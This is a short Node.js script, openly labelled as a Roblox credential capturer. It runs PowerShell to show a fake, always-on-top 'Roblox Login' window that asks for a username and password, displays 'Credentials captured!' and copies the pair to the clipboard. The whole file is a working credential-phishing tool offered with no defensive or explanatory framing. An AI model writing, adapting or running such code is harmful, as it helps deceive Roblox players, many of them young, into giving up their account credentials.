const { exec } = require('child_process');

// Function to capture Roblox credentials
function captureRobloxCredentials() {
    // Command to open the Run dialog and execute the command
    const command = 'powershell -Command "Start-Process powershell -ArgumentList \'Add-Type -AssemblyName System.Windows.Forms; $objForm = New-Object System.Windows.Forms.Form; $objForm.Text = \\\"Roblox Login\\\"; $objForm.Size = New-Object System.Drawing.Size(300,200); $objForm.StartPosition = \\\"CenterScreen\\\"; $objForm.Topmost = $true; $objLabel = New-Object System.Windows.Forms.Label; $objLabel.Text = \\\"Enter your Roblox credentials:\\\"; $objLabel.AutoSize = $true; $objLabel.Location = New-Object System.Drawing.Point(10,20); $objForm.Controls.Add($objLabel); $objTextBoxUsername = New-Object System.Windows.Forms.TextBox; $objTextBoxUsername.Location = New-Object System.Drawing.Point(10,50); $objTextBoxUsername.Size = New-Object System.Drawing.Size(260,20); $objForm.Controls.Add($objTextBoxUsername); $objTextBoxPassword = New-Object System.Windows.Forms.TextBox; $objTextBoxPassword.Location = New-Object System.Drawing.Point(10,80); $objTextBoxPassword.Size = New-Object System.Drawing.Size(260,20); $objTextBoxPassword.PasswordChar = \'\\\*\'; $objForm.Controls.Add($objTextBoxPassword); $objButton = New-Object System.Windows.Forms.Button; $objButton.Text = \\\"Submit\\\"; $objButton.Location = New-Object System.Drawing.Point(10,110); $objButton.Size = New-Object System.Drawing.Size(260,30); $objForm.Controls.Add($objButton); $objButton.Add_Click({$objForm.Close(); $username = $objTextBoxUsername.Text; $password = $objTextBoxPassword.Text; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(\\\"Credentials captured!\\\", \\\"Success\\\", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information); $clipboard = Get-Clipboard; Set-Clipboard -Value (\\\"$username:$password\\\");}); $objForm.Add_Shown({$objForm.Activate()}); [void] $objForm.ShowDialog()\'"';

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`Stderr: ${stderr}`);
            return;
        }
        console.log(`Stdout: ${stdout}`);
    });
}

// Capture Roblox credentials when the script is run
captureRobloxCredentials();
